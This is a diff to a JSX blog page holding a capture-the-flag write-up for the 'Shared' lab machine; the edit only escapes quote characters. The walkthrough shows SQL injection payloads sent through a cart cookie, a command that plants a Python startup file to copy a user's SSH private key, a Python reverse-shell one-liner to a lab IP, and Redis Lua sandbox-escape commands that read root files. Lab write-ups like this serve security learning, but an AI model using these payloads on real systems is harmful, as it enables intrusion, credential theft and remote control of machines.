@@ -39,10 +39,10 @@ const Post = () => (
     <Code>nmap -p- --min-rate 5000 --open -vvv -n -Pn 10.10.11.172 -oG allports</Code>
     <P>Extracting basic info reveals also that the site has moved permanently. Adding the domain name and ip in /etc/hosts file was for me mandatory in order to navigate to the website.</P>
     <WorkImage src="/images/posts/Shared/recon1.png" alt="recon1"/>
-    <P>The web seems to be some kind of online shop. Trying to inject some SQL characters through the "email suscription" field proved to be a fruitless task, so I proceeded to the checkout webpage. We can confirm our conclusions with sqlmap because it will not find any injectable parameter here.</P>
-    <Code>sqlmap -u "http://shared.htb" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3</Code>
+    <P>The web seems to be some kind of online shop. Trying to inject some SQL characters through the &quot;email suscription&quot; field proved to be a fruitless task, so I proceeded to the checkout webpage. We can confirm our conclusions with sqlmap because it will not find any injectable parameter here.</P>
+    <Code>sqlmap -u &quot;http://shared.htb&quot; --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3</Code>
     <WorkImage src="/images/posts/Shared/checkout1.png" alt="checkout1"/>
-    <P>Intercepting this webpage with burpsuite allow us to play with some extra parameters. Doing so we will finally discover that we can do some SQL injection in the custom-cart cookie parameter. Don't forget to URL decode it before forwarding the malicious code.</P>
+    <P>Intercepting this webpage with burpsuite allow us to play with some extra parameters. Doing so we will finally discover that we can do some SQL injection in the custom-cart cookie parameter. Don&apos;t forget to URL decode it before forwarding the malicious code.</P>
     <WorkImage src="/images/posts/Shared/sql_injection_cookie1.png" alt="sql_injection_cookie1"/>
     <P>Let&apos;s find out what kind of database are we compromising:</P>
     <Code>and 1=2 union select 1, @@version, 3-- -</Code>
@@ -50,10 +50,10 @@ const Post = () => (
     <P>After some guesswork we will find out the table names of the database.</P>
     <Code>and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables-- -</Code>
     <WorkImage src="/images/posts/Shared/sql_injection_table_names.png" alt="sql_injection_table_names"/>
-    <P>The table named 'user' seems interesting. Let's find out how many columns does it have.</P>
+    <P>The table named &apos;user&apos; seems interesting. Let&apos;s find out how many columns does it have.</P>
     <Code>order by 4-- -</Code>
     <WorkImage src="/images/posts/Shared/sql_injection_number_columns2.png" alt="sql_injection_number_columns2.png"/>
-    <Code>and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='user'-- -</Code>
+    <Code>and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;user&apos;-- -</Code>
     <WorkImage src="/images/posts/Shared/sql_injection_users_columns.png" alt="sql_injection_users_columns"/>
     <P>Now let&apos;s see what user table contains:</P>
     <Code></Code>
@@ -71,10 +71,10 @@ const Post = () => (
     <P>We will use this vulnerability to copy Dan&apos;s rsa keys to a directory we can actually read with the following code:</P>
     <Code>mkdir -m 777 /tmp/profile_default</Code>
     <Code>mkdir -m 777 /tmp/profile_default/startup</Code>
-    <Code>echo "import os;os.system('cat /home/dan_smith/.ssh/id_rsa &gt; /home/dan_smith.key')" &gt; /tmp/profile_default/startup/foo.py</Code>
+    <Code>echo &quot;import os;os.system(&apos;cat /home/dan_smith/.ssh/id_rsa &gt; /home/dan_smith.key&apos;)&quot; &gt; /tmp/profile_default/startup/foo.py</Code>
     <WorkImage src="/images/posts/Shared/dan_smith_key.png" alt="dan_smith_key"/>
     <P>I also tried to execute an interactive shell as follows but I could not get it to work:</P>
-    <Code>echo "export RHOST="10.10.14.32";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'" &gt; /tmp/profile_default/startup/foo.py</Code>
+    <Code>echo &quot;export RHOST=&quot;10.10.14.32&quot;;export RPORT=9001;python -c &apos;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&apos;&quot; &gt; /tmp/profile_default/startup/foo.py</Code>
     <P>Now we just need to access to Dan user with our new rsa keys. Once done, we get the user flag.</P>
     <P>Our final task is to get root access. Trying linpeas on the new user provides us with the next info:</P>
     <WorkImage src="/images/posts/Shared/redis_connector_dev.png" alt="redis_connector_dev"/>
@@ -86,10 +86,10 @@ const Post = () => (
     <P>I have found the following one, which allows us to remotely execute code:</P>
     <Link href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md">https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md <ExternalLinkIcon mx="2px"></ExternalLinkIcon></Link>
     <P>I tried to get a reverse shell so hard but none of them worked :( One example is the following:</P>
-    <Code>eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("python3 /home/dan_smith/exploit2.py", "r"); local res = f:read("*a"); f:close(); return res' 0</Code>
+    <Code>eval &apos;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;python3 /home/dan_smith/exploit2.py&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&apos; 0</Code>
     <P>If you see what mistake I am commiting, please let me know in any of my social links.</P>
     <P>Nevertheless, finally I captured the flag with the cat command instead of getting a reverse shell.</P>
-    <Code>eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/root.txt", "r"); local res = f:read("*a"); f:close(); return res' 0</Code>
+    <Code>eval &apos;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;cat /root/root.txt&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&apos; 0</Code>
     <WorkImage src="/images/posts/Shared/trying_root_but_get_root_flag_instead.png" alt="rootflag"/>
 	  <P>Pwned!</P>
 
